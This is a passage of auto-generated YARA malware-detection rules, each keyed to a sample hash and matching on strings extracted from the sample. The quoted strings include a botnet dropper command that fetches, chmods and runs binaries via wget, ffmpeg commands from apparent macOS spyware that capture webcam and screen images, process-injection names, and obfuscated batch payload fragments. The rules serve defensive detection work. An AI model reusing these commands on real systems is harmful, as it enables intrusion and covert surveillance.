      $s4 = "Evt:instanceID=\"xmp.iid:48779317-8d09-7147-a2d5-00f92d043626\" stEvt:when=\"2019-04-09T11:19:04+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s5 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s6 = "f77f-1bee-7c44-9df6-f4c722be50a5</rdf:li> </rdf:Bag> </photoshop:DocumentAncestors> </rdf:Description> </rdf:RDF> </x:xmpmeta>  " ascii /* score: '10.00'*/
      $s7 = "019-04-09T11:19:04+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
      $s8 = "* nrEM" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule f721e0e4e1c0cca70a366938748f7f5bf456b27924ca2da4a22c4f945e87a069_f721e0e4 {
   meta:
      description = "_subset_batch - file f721e0e4e1c0cca70a366938748f7f5bf456b27924ca2da4a22c4f945e87a069_f721e0e4.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f721e0e4e1c0cca70a366938748f7f5bf456b27924ca2da4a22c4f945e87a069"
   strings:
      $s1 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.6-c142 79.160924, 2017/07/" ascii /* score: '23.00'*/
      $s2 = "ts/1.1/\" xmlns:photoshop=\"http://ns.adobe.com/photoshop/1.0/\" xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\" xmpMM:DocumentID=\"a" ascii /* score: '17.00'*/
      $s3 = "-http://ns.adobe.com/xap/1.0/" fullword ascii /* score: '17.00'*/
      $s4 = "p://ns.adobe.com/xap/1.0/mm/\" xmlns:stEvt=\"http://ns.adobe.com/xap/1.0/sType/ResourceEvent#\" xmlns:dc=\"http://purl.org/dc/el" ascii /* score: '17.00'*/
      $s5 = "Evt:instanceID=\"xmp.iid:8e5c25c2-bc80-0f4f-995e-127fc4155ee2\" stEvt:when=\"2019-04-09T10:50:13+03:00\" stEvt:softwareAgent=\"A" ascii /* score: '12.00'*/
      $s6 = "06:39        \"> <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"> <rdf:Description rdf:about=\"\" xmlns:xmpMM" ascii /* score: '11.00'*/
      $s7 = "019-04-09T10:50:13+03:00\" stEvt:softwareAgent=\"Adobe Photoshop CC (Windows)\" stEvt:changed=\"/\"/> <rdf:li stEvt:action=\"sav" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 1000KB and
      all of them
}

rule e4ce73b4dbbd360a17f482abcae2d479bc95ea546d67ec257785fa51872b2e3f_e4ce73b4 {
   meta:
      description = "_subset_batch - file e4ce73b4dbbd360a17f482abcae2d479bc95ea546d67ec257785fa51872b2e3f_e4ce73b4.macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e4ce73b4dbbd360a17f482abcae2d479bc95ea546d67ec257785fa51872b2e3f"
   strings:
      $s1 = "__mh_execute_header" fullword ascii /* score: '19.00'*/
      $s2 = "<key>com.apple.security.get-task-allow</key>" fullword ascii /* score: '18.00'*/
      $s3 = "ratio=decrease,hue=s=0\" -y /private/etc/tls3/tmp2.jpg >/dev/null 2>&1" fullword ascii /* score: '18.00'*/
      $s4 = "/usr/local/bin/ffmpeg -f avfoundation -i 1 -frames:v 1 -q 12 -vf scale=1282:-1,hue=s=0 -y /private/etc/tls3/tmp1.jpg >/dev/null " ascii /* score: '17.00'*/
      $s5 = "<key>com.apple.security.temporary-exception.files.absolute-path.read-only</key>" fullword ascii /* score: '17.00'*/
      $s6 = "/usr/local/bin/ffmpeg -f avfoundation -i 2 -frames:v 1 -q 12 -vf \"scale=w='min(1682,iw)':h='min(1682,ih)':force_original_aspect" ascii /* score: '17.00'*/
      $s7 = "/usr/local/bin/ffmpeg -f avfoundation -i 1 -frames:v 1 -q 12 -vf scale=1282:-1,hue=s=0 -y /private/etc/tls3/tmp1.jpg >/dev/null " ascii /* score: '17.00'*/
      $s8 = "tls3_%02d%02d%02d_%02d%02d%02d.log" fullword ascii /* score: '16.00'*/
      $s9 = "_IOHIDElementGetUsagePage" fullword ascii /* score: '14.00'*/
      $s10 = "/usr/local/bin/ffmpeg -f avfoundation -i 2 -frames:v 1 -q 12 -vf \"scale=w='min(1682,iw)':h='min(1682,ih)':force_original_aspect" ascii /* score: '14.00'*/
      $s11 = "<key>com.apple.security.temporary-exception.mach-lookup.global-name</key>" fullword ascii /* score: '14.00'*/
      $s12 = "@_IOHIDElementGetUsagePage" fullword ascii /* score: '14.00'*/
      $s13 = "_IOHIDElementGetUsage" fullword ascii /* score: '14.00'*/
      $s14 = "@_IOHIDElementGetUsage" fullword ascii /* score: '14.00'*/
      $s15 = "/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0xfacf and filesize < 100KB and
      8 of them
}

rule f7a767bbfd0e4c7086150b0ce63ddbdb9f3c2d7c22cc95edc1da84e9af4c6b26_f7a767bb {
   meta:
      description = "_subset_batch - file f7a767bbfd0e4c7086150b0ce63ddbdb9f3c2d7c22cc95edc1da84e9af4c6b26_f7a767bb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f7a767bbfd0e4c7086150b0ce63ddbdb9f3c2d7c22cc95edc1da84e9af4c6b26"
   strings:
      $x1 = "c:\\users\\cloudbuild\\337244\\sdk\\nal\\src\\winnt_wdm\\driver\\objfre_wnet_AMD64\\amd64\\iqvw64e.pdb" fullword ascii /* score: '34.00'*/
      $s2 = "Error dumping shit inside the disk" fullword ascii /* score: '29.00'*/
      $s3 = "Failed to get ntoskrnl.exe" fullword ascii /* score: '27.00'*/
      $s4 = "c:\\users\\cloudbuild\\337244\\sdk\\nal\\src\\winnt_wdm\\driver\\windriverpci_i.c" fullword ascii /* score: '27.00'*/
      $s5 = "_NalWinGetUserAddress: Using memory map table slot %d - Length %d" fullword ascii /* score: '26.00'*/
      $s6 = "Failed to load driver iqvw64e.sys" fullword ascii /* score: '25.00'*/
      $s7 = "https://raw.githubusercontent.com/ByteCorum/DragonBurn/data/version" fullword ascii /* score: '25.00'*/
      $s8 = "VCRUNTIME140_1.dll" fullword ascii /* score: '23.00'*/
      $s9 = "Failed to load ntdll.dll" fullword ascii /* score: '23.00'*/
      $s10 = "WdFilter.sys" fullword ascii /* score: '22.00'*/
      $s11 = "Failed to register and start service for the vulnerable driver" fullword ascii /* score: '22.00'*/
      $s12 = "D:\\Development\\cpp\\StaticDriverMapper\\x64\\Release\\kdmapper_Release.pdb" fullword ascii /* score: '22.00'*/
      $s13 = "iQVW64.SYS" fullword wide /* score: '22.00'*/
      $s14 = "DragonBurn.exe" fullword wide /* score: '22.00'*/
      $s15 = "NalUnmapAddressEx: Address not found in table - not unmapping 0x%p, Length %d" fullword ascii /* score: '20.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule eba9fdb2f077f9a3e14cf428162b967b5e6c189db19c33c5b11601efcd02b3d3_eba9fdb2 {
   meta:
      description = "_subset_batch - file eba9fdb2f077f9a3e14cf428162b967b5e6c189db19c33c5b11601efcd02b3d3_eba9fdb2.macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "eba9fdb2f077f9a3e14cf428162b967b5e6c189db19c33c5b11601efcd02b3d3"
   strings:
      $s1 = "LOADER: failed start child process: %s" fullword ascii /* score: '27.00'*/
      $s2 = "LOADER: failed to fork child process: %s" fullword ascii /* score: '27.00'*/
      $s3 = "LOADER: failed to wait for child process: %s" fullword ascii /* score: '27.00'*/
      $s4 = "LOADER: failed to start child process: %s" fullword ascii /* score: '27.00'*/
      $s5 = "Failed to obtain executable path via _NSGetExecutablePath!" fullword ascii /* score: '24.00'*/
      $s6 = "Failed to execute script '%s' due to unhandled exception!" fullword ascii /* score: '23.00'*/
      $s7 = "Failed to extract %s: failed to open target file!" fullword ascii /* score: '22.50'*/
      $s8 = "__NSGetExecutablePath" fullword ascii /* score: '21.00'*/
      $s9 = "@__NSGetExecutablePath" fullword ascii /* score: '21.00'*/
      $s10 = "%s%c%s.exe" fullword ascii /* score: '20.00'*/
      $s11 = "__mh_execute_header" fullword ascii /* score: '19.00'*/
      $s12 = "LOADER: failed to strdup argv[%d]: %s" fullword ascii /* score: '19.00'*/
      $s13 = "LOADER: failed to destroy sync semaphore (errno %d)!" fullword ascii /* score: '19.00'*/
      $s14 = "LOADER: length of runtime-tmpdir exceeds maximum path length!" fullword ascii /* score: '19.00'*/
      $s15 = "GJDJFJEJG" fullword ascii /* base64 encoded string '$2E$BF' */ /* score: '16.50'*/
   condition:
      uint16(0) == 0xfeca and filesize < 22000KB and
      8 of them
}

rule f8ba9684f11c7e0c20156ca688c861c9_imphash_ {
   meta:
      description = "_subset_batch - file f8ba9684f11c7e0c20156ca688c861c9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8c3c8f24dc0c1d165f14e5a622a1817af4336904a3aabeedee3095098192d91f"
   strings:
      $s1 = "[+] TLS callbacks executed (DLL_PROCESS_ATTACH)." fullword ascii /* score: '27.00'*/
      $s2 = "[-] An error is occured when tying to get the import descriptor !" fullword ascii /* score: '25.00'*/
      $s3 = "DeskbandSDKSample.dll" fullword ascii /* score: '23.00'*/
      $s4 = "[+] DLL LOADER" fullword ascii /* score: '22.00'*/
      $s5 = "[-] An error is occured when trying to get DLL's data !" fullword ascii /* score: '21.00'*/
      $s6 = "AppPolicyGetProcessTerminationMethod" fullword ascii /* score: '20.00'*/
      $s7 = "[+] dllmain have been called (DLL_PROCESS_ATTACH)." fullword ascii /* score: '20.00'*/
      $s8 = "[-] An error is occured when tying to get the import section !" fullword ascii /* score: '19.00'*/
      $s9 = "[-] An error is occured when tying to load %s DLL !" fullword ascii /* score: '19.00'*/
      $s10 = "[+] Import in %s section." fullword ascii /* score: '14.00'*/
      $s11 = "[-] The PE file is not a DLL !" fullword ascii /* score: '13.00'*/
      $s12 = "[+] The PE image correspond to a DLL." fullword ascii /* score: '13.00'*/
      $s13 = "[-] The DLL is not a valid PE file !" fullword ascii /* score: '13.00'*/
      $s14 = "[+] DLL's data at 0x%p" fullword ascii /* score: '13.00'*/
      $s15 = "[+] DLL loaded successfully." fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      8 of them
}

rule Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ce87f6d3 {
   meta:
      description = "_subset_batch - file Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ce87f6d3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ce87f6d3a22f4f96e821e1841ffe34f04dee316a1ae1c68532aa6f2ce2a9763b"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\aanlJDxsIG\\src\\obj\\Debug\\cVll.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "System.Windows.Forms.LeftRightAlignment, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" ascii /* score: '27.00'*/
      $s3 = "System.Windows.Forms.HorizontalAlignment, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e08" ascii /* score: '27.00'*/
      $s4 = "cVll.exe" fullword wide /* score: '22.00'*/
      $s5 = "Vip.CustomForm.Images.SystemButtons.bmp" fullword wide /* score: '17.00'*/
      $s6 = "m_systemCommands" fullword ascii /* score: '15.00'*/
      $s7 = "OnWmSysCommand" fullword ascii /* score: '12.00'*/
      $s8 = "GetButtonCommand" fullword ascii /* score: '12.00'*/
      $s9 = "get_FrameLayout" fullword ascii /* score: '12.00'*/
      $s10 = "-Gets or Set Value to Drop Shadow to the form." fullword ascii /* score: '11.00'*/
      $s11 = "GetButtonImage" fullword ascii /* score: '9.00'*/
      $s12 = "?Gets or sets the alignment between form's icon and form's text." fullword ascii /* score: '9.00'*/
      $s13 = "#Gets/Sets the value for Label text." fullword ascii /* score: '9.00'*/
      $s14 = "get_ShowMinimizeBox" fullword ascii /* score: '9.00'*/
      $s15 = "get_IconBounds" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule fdbdf8ea09a9af32d54979c574260475_imphash_ {
   meta:
      description = "_subset_batch - file fdbdf8ea09a9af32d54979c574260475(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "206f27ae820783b7755bca89f83a0fe096dbb510018dd65b63fc80bd20c03261"
   strings:
      $s1 = "D:\\NSecsoft\\NSec\\NSEC-Client-Kernel\\Drivers\\NSecKrnl\\NSecKrnl\\bin\\NSecKrnl64.pdb" fullword ascii /* score: '27.00'*/
      $s2 = "\\DosDevices\\NSecKrnl" fullword wide /* score: '10.00'*/
      $s3 = "\\Shandong Anzai Information Technology CO.,Ltd" fullword wide /* score: '10.00'*/
      $s4 = ".Shandong Anzai Information Technology CO.,Ltd.0" fullword ascii /* score: '9.00'*/
      $s5 = " Microsoft Operations Puerto Rico1" fullword ascii /* score: '9.00'*/
      $s6 = ".Shandong Anzai Information Technology CO.,Ltd.1" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      all of them
}

rule Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9ea3132e {
   meta:
      description = "_subset_batch - file Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9ea3132e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9ea3132e269bb19d4424f64b55907e533a39e4e4587932f37be3cbe2e0984d89"
   strings:
      $s1 = "sJvE.exe" fullword wide /* score: '22.00'*/
      $s2 = "sJvE.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "palettes.txt" fullword wide /* score: '14.00'*/
      $s4 = "Error exporting palette: " fullword wide /* score: '10.00'*/
      $s5 = "RemoveColorAt" fullword ascii /* score: '9.00'*/
      $s6 = "<GetPalette>b__0" fullword ascii /* score: '9.00'*/
      $s7 = "get_CreatedDate" fullword ascii /* score: '9.00'*/
      $s8 = "btnColorDialog_Click" fullword ascii /* score: '9.00'*/
      $s9 = "GetPalettes" fullword ascii /* score: '9.00'*/
      $s10 = "InputDialog" fullword wide /* score: '9.00'*/
      $s11 = "btnColorDialog" fullword wide /* score: '9.00'*/
      $s12 = " - RGB(" fullword wide /* score: '9.00'*/
      $s13 = "[{GVVu)R3!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule f27f6ded6ca6cc325fa5abc30ff62b2e_imphash_ {
   meta:
      description = "_subset_batch - file f27f6ded6ca6cc325fa5abc30ff62b2e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f62223c9750fb2edfd979a8cae204cb9ce5e0950b52a47b62f195cd05dd3e2fb"
   strings:
      $x1 = "iscsiexe.dll" fullword ascii /* reversed goodware string 'lld.exeiscsi' */ /* score: '33.00'*/
      $s2 = ".data$rs" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      1 of ($x*) and all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__637ed970 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_637ed970.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "637ed97005e481b6d3c09cf74d8053a4367c245a440425f06c033093ecdedea9"
   strings:
      $x1 = "sYgcdvgJl/SfqIMcHzF0kj0tesjCUv5pgTjmsNcULhRKwEY7gI9t41Ag26FqEWfqWNwqwB3hTrE2t/r9naarU4Ihm4EFhOm9vTdAgpVVfBPYBdzVkvHb949lssWbckdT" wide /* score: '75.00'*/
      $x2 = "C:\\Users\\VICTOR\\source\\repos\\VBZXH66\\VBZXH66\\obj\\Debug\\VBZXH66.pdb" fullword ascii /* score: '33.00'*/
      $s3 = "ProcessInjectionUtility" fullword ascii /* score: '25.00'*/
      $s4 = "InjectIntoProcess" fullword ascii /* score: '25.00'*/
      $s5 = "ExecutePayload" fullword ascii /* score: '22.00'*/
      $s6 = "VBZXH66.exe" fullword wide /* score: '22.00'*/
      $s7 = "Execution failed: " fullword wide /* score: '19.00'*/
      $s8 = "processAttributes" fullword ascii /* score: '15.00'*/
      $s9 = "ProcessHollowing" fullword ascii /* score: '15.00'*/
      $s10 = "ReadProcessMemoryInt" fullword ascii /* score: '15.00'*/
      $s11 = "PreprocessInput" fullword ascii /* score: '15.00'*/
      $s12 = "WnYvMkZKN2p0UHpzYkxYVg==" fullword wide /* base64 encoded string 'Zv/2FJ7jtPzsbLXV' */ /* score: '14.00'*/
      $s13 = "YjE2ZDQ3aW1rNnB2YWJ0Yw==" fullword wide /* base64 encoded string 'b16d47imk6pvabtc' */ /* score: '14.00'*/
      $s14 = ".NETFramework,Version=v4.5.2" fullword ascii /* score: '10.00'*/
      $s15 = ".NET Framework 4.5.2" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule Ga_gyt_signature__05d76f59 {
   meta:
      description = "_subset_batch - file Ga-gyt(signature)_05d76f59.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "05d76f597e475999624569a9e2b8146347205540754b77c247e862365381c920"
   strings:
      $s1 = "/proc/%d/cmdline" fullword ascii /* score: '15.00'*/
      $s2 = "systemd" fullword ascii /* score: '11.00'*/
      $s3 = "/proc/%d/comm" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Ga_gyt_signature__65a58bd8 {
   meta:
      description = "_subset_batch - file Ga-gyt(signature)_65a58bd8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "65a58bd8aed74008e2210469582c4213a1b34f3b4ef9c6f22e6d9e2055611b95"
   strings:
      $s1 = "/proc/%d/cmdline" fullword ascii /* score: '15.00'*/
      $s2 = "systemd" fullword ascii /* score: '11.00'*/
      $s3 = "/proc/%d/comm" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Ga_gyt_signature__6a06859c {
   meta:
      description = "_subset_batch - file Ga-gyt(signature)_6a06859c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6a06859cd838ddf894fb1af698a14ca614618fa93374e7eaeabb037d378c1569"
   strings:
      $s1 = "/proc/%d/cmdline" fullword ascii /* score: '15.00'*/
      $s2 = "systemd" fullword ascii /* score: '11.00'*/
      $s3 = "/proc/%d/comm" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Ga_gyt_signature__9f00cc85 {
   meta:
      description = "_subset_batch - file Ga-gyt(signature)_9f00cc85.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9f00cc85190ddc3e1991bb7b362a1d723686ed693008aa36774c18cde77f7041"
   strings:
      $s1 = "/proc/%d/cmdline" fullword ascii /* score: '15.00'*/
      $s2 = "systemd" fullword ascii /* score: '11.00'*/
      $s3 = "/proc/%d/comm" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Ga_gyt_signature__b188a01c {
   meta:
      description = "_subset_batch - file Ga-gyt(signature)_b188a01c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b188a01c69d0fbc740389d25d59a9d5db4bef11e3b10718bd992b31eca8c41da"
   strings:
      $s1 = "/proc/%d/cmdline" fullword ascii /* score: '15.00'*/
      $s2 = "systemd" fullword ascii /* score: '11.00'*/
      $s3 = "/proc/%d/comm" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__7facc227 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7facc227.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7facc22723bef72688ad6fc794b75d9664c348ab1e121101b1508939817d82c3"
   strings:
      $s1 = "Method-56502.exe" fullword wide /* score: '19.00'*/
      $s2 = "get_PackageUrl" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule e7c3f250ee9aaa24400e78f9800fda176ad753bb9e101f99afb26950c0704d45_e7c3f250 {
   meta:
      description = "_subset_batch - file e7c3f250ee9aaa24400e78f9800fda176ad753bb9e101f99afb26950c0704d45_e7c3f250.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e7c3f250ee9aaa24400e78f9800fda176ad753bb9e101f99afb26950c0704d45"
   strings:
      $x1 = "==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* score: '47.00'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                       ' */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                    ' */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                           ' */ /* score: '26.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                               ' */ /* score: '26.50'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                    ' */ /* score: '26.50'*/
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                    ' */ /* score: '26.50'*/
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                      ' */ /* score: '26.50'*/
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                    ' */ /* score: '26.50'*/
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                       ' */ /* score: '26.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                   ' */ /* score: '26.50'*/
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */ /* score: '26.50'*/
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                     ' */ /* score: '26.50'*/
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                            ' */ /* score: '26.50'*/
   condition:
      uint16(0) == 0x3d3d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule e66485247fec675f9a1bb295dc2a14e98054ca2a904ea9856aba36dfec1333b0_e6648524 {
   meta:
      description = "_subset_batch - file e66485247fec675f9a1bb295dc2a14e98054ca2a904ea9856aba36dfec1333b0_e6648524.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e66485247fec675f9a1bb295dc2a14e98054ca2a904ea9856aba36dfec1333b0"
   strings:
      $s1 = "rm -rf arm5; wget http://$ip/arm5;chmod 777 arm5;./arm5 $1" fullword ascii /* score: '19.00'*/
      $s2 = "rm -rf mips; wget http://$ip/mips;chmod 777 mips;./mpsl $1" fullword ascii /* score: '19.00'*/
      $s3 = "rm -rf arm7; wget http://$ip/arm7;chmod 777 arm7;./arm7 $1" fullword ascii /* score: '19.00'*/
      $s4 = "rm -rf mpsl; wget http://$ip/mpsl;chmod 777 mpsl;./mips $1" fullword ascii /* score: '19.00'*/
      $s5 = "rm -rf arm6; wget http://$ip/arm6;chmod 777 arm6;./arm6 $1" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x7069 and filesize < 1KB and
      all of them
}

rule e66bc1d78f8062d13622177669f88df75a2513e587bcff250a031554d17e5887_e66bc1d7 {
   meta:
      description = "_subset_batch - file e66bc1d78f8062d13622177669f88df75a2513e587bcff250a031554d17e5887_e66bc1d7.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e66bc1d78f8062d13622177669f88df75a2513e587bcff250a031554d17e5887"
   strings:
      $s1 = "622316.hta" fullword ascii /* score: '11.00'*/
      $s2 = "yBFN -jpa" fullword ascii /* score: '8.00'*/
      $s3 = "622316.htaPK" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 20KB and
      all of them
}

rule f6f78c7cd75e62f0b01afdd52b4fc3a6a7815e44cbed5de81de2373001cd6aeb_f6f78c7c {
   meta:
      description = "_subset_batch - file f6f78c7cd75e62f0b01afdd52b4fc3a6a7815e44cbed5de81de2373001cd6aeb_f6f78c7c.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f6f78c7cd75e62f0b01afdd52b4fc3a6a7815e44cbed5de81de2373001cd6aeb"
   strings:
      $x1 = ":: 6NkXCADZFwgAQv1LAtiRuoRrNd15oFRuElcicbPO26D/xNHdJLcd8IgAAAAAB6F1ZFyKxE74YWF2OE9KO2/DhiTB+mreE4vvbjHX9yiPy1JJ3IDxfojbdZNaBP51X" ascii /* score: '61.00'*/
      $s2 = "%vioso%%vioso% WFKXLIjGZFzlKKglzUiXboThkdbSqGUbjhVBIfaCjZddhuSOEKPsodAJyAAepRpXVWEuWoGqpvuzXzpQkXZhoHrcZkeXEghUpUwjQFLLNqVsKMetP" ascii /* score: '28.00'*/
      $s3 = "JJbb1d/esamJgEtQcOzkmzLy9xFFsUluXFkc9liBoac6dq/R77NcqvoiJEJEtFzPLQ19wkIQ4LdnDpEm6mGIVPOQfuSQGPJfkh4p7zg4JJuNmqvoNOM35OOkeYNaZOzH" ascii /* score: '19.00'*/
      $s4 = "JCnlwjZkdBbZTftP3k55H3OCjet293BookVmN3oXdQX04/D59C9gBuvhTtvT+jXpHzkMjtFzlL/FUbTPqiZflo0Kzn1jl3uqLGQBzpobInm8yoZ+pmH5dJw92QAtHNym" ascii /* score: '19.00'*/
      $s5 = "/rj4yYZnBPhRKk8shmw4satLpmN5ft5UnvHPUEYEfFXfIHKDUA/2NHtLWvc+YrHi+a24tiWXnwLaC0NznEjGyZ4dJfAlFw7FJdzRJiVCOMpYu0dQ4VW5ZRRuOaYeuYYn" ascii /* score: '19.00'*/
      $s6 = "%sdqZxwXd% %XvyOGkUu% %MuzppFgM%%username%%iGafwqvy%%rxuTBOmc%%HybCcosk% %sdqZxwXd% %RpByHLqb%%wpspSvzN% %MuzppFgM%%temp%%AYFgQo" ascii /* score: '18.00'*/
